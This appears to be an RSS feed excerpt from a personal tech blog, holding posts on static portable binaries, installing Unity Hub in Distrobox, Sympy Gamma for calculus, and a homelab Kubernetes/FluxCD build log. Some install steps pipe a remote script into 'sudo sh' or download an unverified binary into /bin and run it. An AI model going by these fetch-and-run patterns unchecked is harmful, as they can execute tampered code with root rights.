<span id="cb17-4">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lkvm: No such file or directory</span>
<span id="cb17-5">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lprocstat: No such file or directory</span>
<span id="cb17-6">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -ldevstat: No such file or directory</span>
<span id="cb17-7">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lexecinfo: No such file or directory</span>
<span id="cb17-8">          collect2: error: ld returned 1 exit status</span></code></pre></div>
<p>Zellij already ships a <a href="https://github.com/zellij-org/zellij/releases">static version on their releases</a> (zellij-x86_64-unknown-linux-musl.tar.gz). From my testing, it only runs on Linux.</p>
</section>
<section id="python" class="level2">
<h2 class="anchored" data-anchor-id="python">Python</h2>
<ul>
<li><a href="https://github.com/indygreg/python-build-standalone" class="uri">https://github.com/indygreg/python-build-standalone</a> / <a href="https://gregoryszorc.com/docs/python-build-standalone/main/" class="uri">https://gregoryszorc.com/docs/python-build-standalone/main/</a></li>
<li><a href="https://pyoxidizer.readthedocs.io/en/latest/pyoxy.html" class="uri">https://pyoxidizer.readthedocs.io/en/latest/pyoxy.html</a></li>
<li><a href="https://wiki.python.org/moin/BuildStatically" class="uri">https://wiki.python.org/moin/BuildStatically</a> — not as promising</li>
<li><a href="https://github.com/RustPython/RustPython" class="uri">https://github.com/RustPython/RustPython</a>
<ul>
<li>Not <a href="https://rustpython.github.io/pages/whats-left">feature complete</a></li>
</ul></li>
</ul>
<p>Also, I just want to note about python, that <code>help('modules')</code> in an interactive shell will list all the modules that a python interpreter is able to access. With statically compiled versions of python, this shows what python libraries have been bundled with the library.</p>
<section id="indygreg-python" class="level3">
<h3 class="anchored" data-anchor-id="indygreg-python">IndyGreg Python</h3>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb18-1">usage: build-main.py [-h]</span>
<span id="cb18-2">                     [--target-triple {s390x-unknown-linux-gnu,x86_64_v4-unknown-linux-gnu,ppc64le-unknown-linux-gnu,x86_64_v2-unknown-linux-gnu,i686-unknown-linux-gnu,x86_64_v3-unknown-linux-gnu,x86_64-unknown-linux-musl,x86_64-unknown-linux-gnu,armv7-unknown-linux-gnueabihf,armv7-unknown-linux-gnueabi,x86_64_v4-unknown-linux-musl,mipsel-unknown-linux-gnu,x86_64_v3-unknown-linux-musl,mips-unknown-linux-gnu,aarch64-unknown-linux-gnu,x86_64_v2-unknown-linux-musl}]</span>
<span id="cb18-3">                     [--optimizations {lto,pgo+lto,noopt,pgo,debug}] [--python {cpython-3.10,cpython-3.11,cpython-3.8,cpython-3.12,cpython-3.9}] [--python-source PYTHON_SOURCE]</span>
<span id="cb18-4">                     [--break-on-failure] [--no-docker] [--serial]</span>
<span id="cb18-5">                     [--make-target {default,toolchain-image-xcb,toolchain-image-build,empty,toolchain-image-xcb.cross,toolchain-image-gcc,toolchain,toolchain-image-build.cross}]</span>
<span id="cb18-6">build-main.py: error: argument --target-triple: invalid choice: 'x86_64-unknown-freebsd' (choose from 's390x-unknown-linux-gnu', 'x86_64_v4-unknown-linux-gnu', 'ppc64le-unknown-linux-gnu', 'x86_64_v2-unknown-linux-gnu', 'i686-unknown-linux-gnu', 'x86_64_v3-unknown-linux-gnu', 'x86_64-unknown-linux-musl', 'x86_64-unknown-linux-gnu', 'armv7-unknown-linux-gnueabihf', 'armv7-unknown-linux-gnueabi', 'x86_64_v4-unknown-linux-musl', 'mipsel-unknown-linux-gnu', 'x86_64_v3-unknown-linux-musl', 'mips-unknown-linux-gnu', 'aarch64-unknown-linux-gnu', 'x86_64_v2-unknown-linux-musl')</span>
<span id="cb18-7">[moonpie@lizard python-build-standalone]$ ./build-linux.py --target x86_64-unknown-freebsd</span></code></pre></div>
<p>No freebsd or other non-linux support.</p>
</section>
</section>
<section id="coreutils" class="level2">
<h2 class="anchored" data-anchor-id="coreutils">Coreutils</h2>
<ul>
<li><a href="https://github.com/uutils/coreutils" class="uri">https://github.com/uutils/coreutils</a></li>
<li><a href="https://packages.debian.org/sid/busybox-static" class="uri">https://packages.debian.org/sid/busybox-static</a></li>
<li><a href="https://busybox.net/FAQ.html" class="uri">https://busybox.net/FAQ.html</a> — looks like busybox releases are already staticly linked, but they mostly focus on Linux releases</li>
<li><a href="https://github.com/ahgamut/superconfigure/releases/" class="uri">https://github.com/ahgamut/superconfigure/releases/</a> — this is cosmo. I would prefer a single binary though, for simplicity, rather than seperate staticly compiled coreutils which is what this is. But, if in a pinch, it makes a good replacement for a broken coreutil.</li>
</ul>
</section>
<section id="toolpacks" class="level2">
<h2 class="anchored" data-anchor-id="toolpacks">Toolpacks</h2>
<p>I recently learned about a new project, called <a href="https://github.com/Azathothas/Toolpacks">Toolpacks</a>. Toolpacks is a truly massive set of static binaries, with so many utilities, including zellij, tmux, ssh, and many others. I see 2292 binaries for x86_64 Linux, and good amounts for Windows and Arm Linux as well.</p>
<p>Another cool thing about Toolpacks is that they also provide <a href="https://en.wikipedia.org/wiki/UPX">UPX</a> versions of the software they distribute. UPX is a method of creating self extracting, compressed binaries that further saves space. For example:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb19-1">[moonpie@lizard toolpack]$ du -sh zellij</span>
<span id="cb19-2">30M     zellij</span>
<span id="cb19-3">[moonpie@lizard toolpack]$ du -sh zellij.upx</span>
<span id="cb19-4">8.6M    zellij.upx</span></code></pre></div>
<p>That’s a pretty big reduction on the zellij binary, which is one of the largest binaries I’ve seen. Interesting, they also have caddy, and nginx. I find this very promising.</p>
<p>There are also builds of busybox or toybox, which could replace coreutils in a pinch on Linux machines. There are a few other interesting one’s, such as <a href="https://github.com/vdjagilev/nmap-formatter">nmap-formatter</a>, a software that can format nmap XML output and convert it to CSV or other formats, which we may find easier to submit.</p>
</section>
</section>
<section id="dockerc" class="level1">
<h1>Dockerc</h1>
<p><a href="https://github.com/NilsIrl/dockerc">Dockerc</a> is a project that compiles a docker container to a static executable, by bundling the runtime. I discovered this because it was packaged on the Toolpacks listed above.</p>
<p>Because it is a container, I’m going to assume that this solution only works on Linux — but that doesn’t mean it’s not useful.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb20-1">vagrant@debian10:~$ sudo dockerc --image docker://library/httpd -o httpd --rootfull</span>
<span id="cb20-2">vagrant@debian10:~$ sudo ./httpd</span>
<span id="cb20-3">unknown argument ignored: lazytime</span>
<span id="cb20-4">AH00557: httpd: apr_sockaddr_info_get() failed for umoci-default</span>
<span id="cb20-5">AH00557: httpd: apr_sockaddr_info_ge....</span></code></pre></div>
<p>And it works — kinda. httpd doesn’t seem to bind an address. However, if I use an alpine container (which starts a shell), and then test with <code>python -m http.server</code>, that binds an address to the same localhost as the alpine machine.</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb21-1">sudo dockerc --image docker://docker.io/library/nginx --output nginx --rootfull</span>
<span id="cb21-2"></span>
<span id="cb21-3">sudo ./nginx</span></code></pre></div>
<p>This also does not bind ports.</p>
</section>
<section id="less-promising-options" class="level1">
<h1>Less promising options</h1>
<section id="pkgin" class="level2">
<h2 class="anchored" data-anchor-id="pkgin">pkgin</h2>
<p><a href="https://pkgin.net/" class="uri">https://pkgin.net/</a></p>
<p>Pkgin is a package manager that can manage packages compiled by <a href="https://www.pkgsrc.org/">pkgsrc</a>. It works on multiple BSDs (including Dragonfly), Macos, and Debian Linux. I don’t think we’ll ever see OpenSolaris but we’ll see.</p>


</section>
</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/ape-experiments/</guid>
  <pubDate>Thu, 31 Oct 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Installing Unity on Distrobox</title>
  <link>./guides/unity-distrobox/</link>
  <description><![CDATA[ 




<p>First, begin with installing distrobox and podman, on your respective distro.</p>
<p>Here’s how to do it one some of the major distros:</p>
<pre><code>pacman -Syu distrobox podman</code></pre>
<pre><code>apt update &amp;&amp; apt install -y distrobox podman</code></pre>
<pre><code>dnf install distrobox podman</code></pre>
<p>Then, create an Ubuntu 22.04 container, since that is what Unity officially supports.</p>
<p><code>distrobox create --image docker.io/library/ubuntu:22.04 --name unity</code></p>
<p>Then, you can enter the container:</p>
<p>`<code>distrobox enter unity</code></p>
<p>From here, follow the steps on <a href="https://docs.unity3d.com/hub/manual/InstallHub.html">Unity’s official site</a>:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">wget -qO - https://hub.unity3d.com/linux/keys/public | gpg --dearmor | sudo tee /usr/share/keyrings/Unity_Technologies_ApS.gpg &gt; /dev/null</span></code></pre></div>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">sudo sh -c 'echo "deb [signed-by=/usr/share/keyrings/Unity_Technologies_ApS.gpg] https://hub.unity3d.com/linux/repos/deb stable main" &gt; /etc/apt/sources.list.d/unityhub.list'</span></code></pre></div>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">sudo apt update &amp;&amp; sudo apt install unityhub</span></code></pre></div>
<p>After this, install Microsoft VSCode using <a href="https://code.visualstudio.com/docs/setup/linux">their official steps</a></p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">sudo apt-get install wget gpg apt-transport-https</span></code></pre></div>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" |sudo tee /etc/apt/sources.list.d/vscode.list &gt; /dev/null</span></code></pre></div>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">rm -f packages.microsoft.gpg</span></code></pre></div>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">sudo apt update &amp;&amp; sudo apt install code -y</span></code></pre></div>
<p>Since we are doing unity development, we will also need <code>dotnet-sdk-8.0</code>, and <code>git</code></p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">sudo apt install dotnet-sdk-8.0 git</span></code></pre></div>
<section id="vscode-configuration" class="level1">
<h1>VSCode Configuration</h1>
<p>There are several extensions that significantly enhance the C#, .NET, and Unity development experience.</p>
<p><code>ms-dotnettools.csharp</code> — This is Microsoft’s C# and .NET extension, and it will pull a few extensions as a dependency.</p>
<p><code>VisualStudioToolsForUnity.vstuc</code> — This is Microsoft’s official Unity extension.</p>
</section>
<section id="logging-into-unity-hub" class="level1">
<h1>Logging into Unity Hub</h1>
<p>This process can be somewhat difficult, as Unity Hub will not show up on the desktop.</p>
<p>And for some reason, I needed flatpak on my host system (or more likely, one of it’s dependencies).</p>
<p><code>sudo pacman -Syu flatpak</code> — or however your distro will install flatpak.</p>
<p>First, launch unity in the container.</p>
<pre><code>distrobox enter unity</code></pre>
<pre><code>unityhub</code></pre>
<p>Then, click the login button. A browser will be opened, asking you to login. However, you will not automatically be redirected to Unity Hub, from that page, you have to do it manually.</p>
<p>Copy the link on the bottom right. And then, in another distrobox session (Unity Hub must still be running for this to work)</p>
<pre><code>unityhub [copied link]</code></pre>
<p>If you need to install a specific version of Unity not available in the Unity Hub, this is a similar process. Go to <a href="https://unity.com/releases/editor/archive">Unity’s release archive</a>, find the relevant link, and then copy the install link, and paste it like above.</p>
</section>
<section id="misc" class="level1">
<h1>Misc</h1>
<p>One thing I like to do is use <a href="https://zellij.dev/">Zellij</a> as a terminal multiplexer</p>
<pre><code>cd /bin

sudo wget https://bin.ajam.dev/x86_64_Linux/zellij

sudo chmod +x zellij

zellij</code></pre>


</section>

 ]]></description>
  <category>guides</category>
  <guid>./guides/unity-distrobox/</guid>
  <pubDate>Sun, 27 Oct 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Sympy Gamma, my favorite WolframAlpha alternative</title>
  <link>./guides/sympy/</link>
  <description><![CDATA[ 




<section id="intro" class="level1">
<h1>Intro</h1>
<p>Many people know about Wolfram Alpha for it’s powerful ability to give step by step solutions to calculus problems… but only if you pay.</p>
<p>Because of this, I use a free (both as in beer, and as in freedom) alternative, called <a href="https://gamma.sympy.org/">Sympy Gamma</a>. The source code is <a href="https://github.com/sympy/sympy_gamma">on github</a>.</p>
<p><img src="./guides/sympy/images/parts.jpeg" class="img-fluid"></p>
<p>It can also do partial fraction decomposition, trig subsitution, and more.</p>
<p>The step by step solutions, work by several special functions, that attempt to mimic how a student would solve a problem.</p>
</section>
<section id="location" class="level1">
<h1>Location:</h1>
<p>There are two urls:</p>
<p><a href="sympygamma.com">sympygamma.com</a></p>
<p><a href="gamma.sympy.org">gamma.sympy.org</a></p>
<p>As far as I can tell, these are two different instances of Sympy Gamma, with different rate limits.</p>
<p>Also, if you use the duckduckgo bang !sympy, then it inputs a function into <a href="sympygamma.com">sympygamma.com</a>.</p>
<p>There is also <a href="https://sympy-beta.vercel.app/">Sympy Beta</a> (<a href="https://github.com/eagleoflqj/sympy_beta">Source code</a>), which is a version of sympy ported to work entirely in the local browser, using Pyodide and webassembly. I’ve found that it manages to succeed where Sympy Gamma fails, and it also gets around rate limits since it works locally. In addition to that, Sympy Beta is a progressive web app, meaning it works offline after you open it in your browser once.</p>
<p>After some testing, I actually think I like Sympy Beta better, because of the reasons mentioned above, and some failures of Gamma mentioned below. In addition to that, I could not figure out how to self host Sympy Gamma, as the docker compose would not work. However, Sympy Beta seems to be a simpler, all in one NPM application.</p>
</section>
<section id="functions" class="level1">
<h1>Functions</h1>
<p>Below are some of the functions I use commmonly, but really, you can use anything from python and the sympy library.</p>
<p>For most functions, the form is something like <code>function(arguments)</code> with the arguments in parenthesis. <em>Some</em> natural lanugage works in Sympy Beta, but it’s better to just use the python syntax.</p>
<section id="calculus" class="level2">
<h2 class="anchored" data-anchor-id="calculus">Calculus</h2>
<p><a href="https://docs.sympy.org/latest/modules/integrals/integrals.html">integrate()</a> — also, if you use this function with sympy gamma, it will give you the step by step solution! Most of the time. It sometimes fails, either because sympy can’t figure it out or due to rate limits.</p>
<p>For example, the partial fractions decomposition step-by-step solutions don’t often show up on Sympy Gamma, and are somewhat obfuscated on Sympy Beta. Sympy Beta often offers multiple solutions as well, with some of them not being partial fraction decomposition. I think the Sympy manual integrate function doesn’t have an explicit rule to do partial fractions decomposition.</p>
<p><img src="./guides/sympy/images/partsterm1.jpeg" class="img-fluid"> <img src="./guides/sympy/images/partsterm2.jpeg" class="img-fluid"></p>
<p><a href="https://docs.sympy.org/latest/modules/polys/reference.html#sympy.polys.partfrac.apart">apart()</a> — partial fraction decomposition!</p>
<p><img src="./guides/sympy/images/apart.jpeg" class="img-fluid"></p>
<p><a href="https://docs.sympy.org/latest/modules/core.html#sympy.core.function.diff">diff(f(x))</a> — Take the derivative of a function — with steps!</p>
<p><img src="./guides/sympy/images/diff.jpeg" class="img-fluid"></p>
<p><a href="https://docs.sympy.org/latest/tutorials/intro-tutorial/calculus.html#limits">limit(f(x), (x, limit))</a> — calculate the limit of a function</p>
<p><a href="https://docs.sympy.org/latest/modules/polys/reference.html#sympy.polys.polytools.factor">factor(polynomial)</a> — factors a polynomia into irreducible terms.</p>
<p><a href="https://docs.sympy.org/latest/modules/plotting.html#sympy.plotting.plot.plot">plot(f(x))</a> — plots a function, and shows the graph.</p>
<p><a href="https://docs.sympy.org/latest/modules/concrete.html#sympy.concrete.summations.summation">summation(f(x), (x, bottom, top))</a> — do a sum. Have top be <code>oo</code> for an infinite sum. Also, on sympy gamma, appending <code>.doit()</code> to this function gives me more information with finite sums.</p>
<p><a href="https://docs.sympy.org/latest/modules/core.html#sympy.core.expr.Expr.series">series(f(x), x, around, numofterms)</a> — compute a Taylor Series, around “around”, with up to “numofterms” terms. It should be noted that after it computes “goto” terms, it will combine like enough terms, leaving you with less terms than you may have wanted.</p>
<p><code>help(function)</code> — this function shows you the documentation of any function. This is a built in function into python.</p>
<p>There are many, many more functions, and they can be found on the <a href="https://docs.sympy.org/latest/index.html">sympy documentation</a>.</p>
</section>
</section>
<section id="linear-algebra" class="level1">
<h1>Linear Algebra</h1>
<p>Firstly, these matrix operations only seem to work on <a href="https://sympy-beta.vercel.app/">Sympy Beta</a>.</p>
<p><code>Matrix([[0, 0, 0], [0, 0, 0]])</code> creates a matrix with 2 rows and 3 columns.</p>
<p>This can be used in other functions, like <code>rref</code>, to get the reduced row echelon form.</p>
<p><code>Matrix.rref(Matrix([[1, 1, 1], [1, 2, 3], [1, 2, 4]]))</code></p>
<p>You can even solve for abitrary constants using <code>a</code>, <code>b</code>, and <code>c</code></p>
<p><img src="./guides/sympy/images/matrixrref.jpeg" class="img-fluid"></p>
</section>
<section id="keywords-and-variables" class="level1">
<h1>Keywords and Variables</h1>
<p>It’s not like a normal calculator. Sympy is a Python library, meaning everything is designed to be code first. Since it isn’t really good practice to put special symbols like “π” in code, there are alternative, purely text values that you can use to refer to the value of pi, infinity, or <em>e</em>.</p>
<p><code>oo</code> = infinity. Yes, that is two o’s put togetheer.</p>
<p><code>E</code> = <em>e</em>. It should be noted that lowercase e does not work.</p>
<p><code>pi</code> = π. The classic pi, 3.1415…</p>
</section>
<section id="other-resources-for-learning-math-independently" class="level1">
<h1>Other resources for learning math independently:</h1>
<p>For Calculus, I really like:</p>
<ul>
<li><a href="https://en.wikibooks.org/wiki/Calculus">Wikibooks — Calculus</a></li>
<li><a href="https://tutorial.math.lamar.edu/">Paul’s Math Notes</a></li>
<li>Openstax’s Calulcus Textbooks, <a href="https://openstax.org/details/books/calculus-volume-1">Volume 1</a>, <a href="https://openstax.org/details/books/calculus-volume-2">Volume 2</a>, and <a href="https://openstax.org/details/books/calculus-volume-3">Volume 3</a>. Also, <a href="https://math.libretexts.org/Bookshelves/Calculus/Calculus_(OpenStax)">Full book on libretexts</a></li>
</ul>
<p>For Linear Algebra:</p>
<ul>
<li><a href="https://hefferon.net/linearalgebra/">Heffron’s Linear Algebra</a></li>
<li><a href="https://math.libretexts.org/Bookshelves/Linear_Algebra/A_First_Course_in_Linear_Algebra_(Kuttler)">A First Course in Linear Algebra (Libretexts)</a></li>
</ul>


</section>

 ]]></description>
  <category>guides</category>
  <guid>./guides/sympy/</guid>
  <pubDate>Sun, 13 Oct 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Build Server 5 — Kubernetes, GitOps, FluxCD</title>
  <link>./projects/build-server-5/</link>
  <description><![CDATA[ 




<section id="failure-and-whats-next" class="level1">
<h1>Failure and What’s Next</h1>
<p>I wanted a custom solution that used FluxCD to deploy Openstack, since I wanted my entire setup, inclduing Openstack, to be tracked in a Git repo (GitOps).</p>
<blockquote class="blockquote">
<p><a href="https://docs.starlingx.io/system_configuration/index-sysconf-d511820651f0.html#starlingx-openstack">StarlingX OpenStack is installed and managed as an FluxCD application.</a></p>
</blockquote>
<p>Now, StarlingX, sadly, is not GitOps OpenStack. Configurations to the OpenStack application are done via the command line, or via helm value files. Perhaps I can clone the flux repo they use, but truthfully, I’m not going to worry about it for now.</p>
<p>I would like an OpenStack deployment up shortly, and while this project is fun (and definitely possible it seems), it is taking too long.</p>
</section>
<section id="background-goals" class="level1">
<h1>Background &amp; Goals</h1>
<p>Since I got literally no work done on my server, I think it would be prudent to scale down. Rather than opting for a larger option.</p>
<p>In the order I want, here are concrete goals:</p>
<ul>
<li>Syncthing: (I need this in order to sync files between my two laptops)</li>
<li>Oauth2/Openid/Ldap (Kanidm or Authentik)
<ul>
<li>I might switch to <a href="https://kanidm.com/">Kanidm</a> from authentik as my authentication server, as it seems a lot simpler… but it doesn’t seem to support invites</li>
</ul></li>
<li>Virtual Machine host with a web UI that I can give out to others. I’m currently looking at Incus or Ovirt.</li>
</ul>
<p>I recently learned that <a href="https://www.ovirt.org/">Ovirt</a> was still maintained, and it seems to be feature complete. It contains every feature I want, like oauth2 authentication, port security, and a web UI. Although, due to Red Hat abandoning the project, it likely wont’ get beyond feature updates, and instead just get bug and security updates, the software does what I want it to do.</p>
</section>
<section id="software-selection" class="level1">
<h1>Software Selection</h1>
<section id="virtual-machine-manager" class="level2">
<h2 class="anchored" data-anchor-id="virtual-machine-manager">Virtual Machine Manager</h2>
<p>Incus: * <a href="">Authentication</a> - Openid connection * <a href="https://linuxcontainers.org/incus/docs/main/authorization/">Authorization</a> - Openfga authorization - Do I have to create a project for each user? (seems to be no… <a href="https://linuxcontainers.org/incus/docs/main/howto/projects_confine/#confine-projects-to-specific-incus-users">Incus can be configured to dynamically create projects for all users in a specific user group</a>) - What is the difference between the varios levels of authority * <a href="https://linuxcontainers.org/incus/docs/main/explanation/security/#network-security">Port security</a> - Can be overrided on a per instance basis… but how can I make this an unchangable default?</p>
</section>
<section id="authentication" class="level2">
<h2 class="anchored" data-anchor-id="authentication">Authentication</h2>
<p>I’m currently deciding between kanidm and authentik.</p>
<p><a href="https://www.reddit.com/r/selfhosted/comments/wre8ua/authentiktraefikk8sfluxcd_because_documentation/">Here is an authentik on kubernetes with fluxcd guide I foudn</a>.</p>
</section>
</section>
<section id="testing-incus" class="level1">
<h1>Testing Incus</h1>
<p>So, Incus is only packaged in <a href="https://backports.debian.org/Instructions/">Debian backports</a>. The first step is to add those. After that, <code>apt update</code>, <code>apt upgrade</code> and <code>apt install incus-tools incus incus-agent incus-client</code>.</p>
<p>Then, to initialize incus, <a href="https://linuxcontainers.org/incus/docs/main/tutorial/first_steps/">first steps documentation</a>.</p>
</section>
<section id="rke2-try-2" class="level1">
<h1>RKE2 Try 2</h1>
<p>I uninstalled RKE2, but I want to redeploy my services on it again.</p>
<p><a href="https://docs.rke2.io/install/quickstart">Quick start guide</a></p>
<p><code>curl -sfL https://get.rke2.io | sudo sh -</code> (for some reason it crashed and didn’t start when I ran it in a root machinectl session)</p>
<p>I then copied over <code>/etc/rancher/rke2/rke2.yaml</code> to <code>~/.kube/config</code> on my local machine, in order to configure kubernetes from my local machine.</p>
<section id="dynamic-ip-issues" class="level2">
<h2 class="anchored" data-anchor-id="dynamic-ip-issues">Dynamic IP Issues</h2>
<p>So apparently kubernetes, by default, can’t handle dynamic ip addressed. It crashes when I attempt to start it, because my ip address changed.</p>
<p>At the same time, my <a href="https://hub.docker.com/r/qmcgaw/ddns-updater">dynamic dns updater</a> stopped working. I think it’s because the porkbun API changed, but my container did not update, as I did not have container auto update enabled. (1/28/2025)</p>
<p>So it’s clear that dynamic ip/dns must be done from <em>inside</em> kubernetes. But it looks like <a href="https://docs.k3s.io/networking/distributed-multicloud?_highlight=dynamic#embedded-k3s-multicloud-solution">rke2/k3s</a> doesn’t have much support for dynamically changing ip addresses, instead requiring you to manually change it via a command line flag. <a href="https://stackoverflow.com/questions/49249712/how-to-make-kubernetes-work-with-dynamic-ip-address">Another stackoverflow post</a> claims that there is no way to do DNS, but a <a href="https://github.com/kubernetes/kubernetes/pull/62314#discussion_r181482584">github issue</a> says that the function that the stackoverflow post is referencing is not used except beyond generating <code>.kubeconfigs</code>.</p>
<p>I also found <a href="https://cdcloudlogix.com/ddclient-on-kubernetes/">1</a>, <a href="https://www.lachlanlife.net/posts/2022-11-dynamic-dns/">2</a>, <a href="https://codeburst.io/ddclient-c9a6ac1d8f81">3</a> sources on using dynamic DNS, but they all work by assigning having the server behind a router, where the server itself doesn’t have dynamic ip address.</p>
<p>However, there is something interesting: My server’s main ethernet port retains the same IP addresss it started with. This issue was caused by NetworkManager attempting to give my weird veth setup an ip address, which the rest of services on the server began to think that was the server’s main ip address. I am considering simply not handling the fact that Kubernetes cannot handle dynamic ip addresses, since my server seems to get a constant ip address.</p>
<p>I do, however, have to fix dynamic dns. The issue was that the <a href="https://hub.docker.com/r/qmcgaw/ddns-updater">dynamic dns updater</a> container did not auto update, and I need to fix that with podman.</p>
<p>But taking a quick look at the <a href="https://docs.podman.io/en/latest/markdown/podman-auto-update.1.html">relevant docs</a>, it seems like podman only supports auto updates in the background if a systemd quadlet is used. Debian Linux does not have recent enough version of podman to have this feature.</p>
<p>Wait, I just realized that I don’t actually need dynamic DNS. Since my IP address will not change, I can just not bother with this.</p>
</section>
<section id="fluxcd" class="level2">
<h2 class="anchored" data-anchor-id="fluxcd">FluxCD</h2>
<p>Now, I also realized that git can work over ssh. So I have a git repo, called <code>fleet-charts</code>, located on my server, which I will access from my laptop via ssh.</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing/fleet-charts --branch=main --private-key-file=/home/moonpie/.ssh/moonstack</span>
<span id="cb1-2">► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing/fleet-charts"</span>
<span id="cb1-3">⚠️  clone failure: unable to clone: repository not found: git repository: 'ssh://moonpie@moonpiedumpl.ing/fleet-charts'</span>
<span id="cb1-4">⚠️  clone failure: unable to clone: repository not found: git repository: 'ssh://moonpie@moonpiedumpl.ing/fleet-charts'</span>
<span id="cb1-5">✗ failed to clone repository: unable to clone: repository not found: git repository: 'ssh://moonpie@moonpiedumpl.ing/fleet-charts</span></code></pre></div>
<p>I find this odd, because ssh works normally:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">[moonpie@lizard vscode]$ ssh moonpie@moonpiedumpl.ing -i /home/moonpie/.ssh/moonstack</span>
<span id="cb2-2"></span>
<span id="cb2-3">moonpie@thoth:~$</span></code></pre></div>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing:22/home/moonpie/fleet-charts --branch=main --private-key-file=/home/moonpie/.ssh/moonstack --verbose</span>
<span id="cb3-2">► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing:22/home/moonpie/fleet-charts"</span>
<span id="cb3-3">✔ cloned repository</span>
<span id="cb3-4">► generating component manifests</span>
<span id="cb3-5">✔ generated component manifests</span>
<span id="cb3-6">✔ committed component manifests to "main" ("a69831db70bea88e9ebc9810b78a33831929793c")</span>
<span id="cb3-7">► pushing component manifests to "ssh://moonpie@moonpiedumpl.ing:22/home/moonpie/fleet-charts"</span>
<span id="cb3-8">► installing components in "flux-system" namespace</span></code></pre></div>
<p>So it looks like I must use an absolute path, and cannot use “~” for relative patths. Or maybe I can use the <code>$HOME</code> environment variable.</p>
<p>But I actually don’t like this setup. I uninstalled flux, and I want to redeploy it, but wish ssh on a different port instead. I want port 22 on this server to be availble for the forgejo ssh service, rather than to be a the administrative ssh service. I’m going to change ssh to port <code>22022</code> in order to avoid conflicts with other services.</p>
<details>
<summary>
Show install command
</summary>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/fleet-charts --branch=main --private-key-file=/home/moonpie/.ssh/moonstack --verbose</span>
<span id="cb4-2">► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/fleet-charts"</span>
<span id="cb4-3">✔ cloned repository</span>
<span id="cb4-4">► generating component manifests</span>
<span id="cb4-5">✔ generated component manifests</span>
<span id="cb4-6">✔ component manifests are up to date</span>
<span id="cb4-7">► installing components in "flux-system" namespace</span>
<span id="cb4-8">✔ installed components</span>
<span id="cb4-9">✔ reconciled components</span>
<span id="cb4-10">► determining if source secret "flux-system/flux-system" exists</span>
<span id="cb4-11">► generating source secret</span>
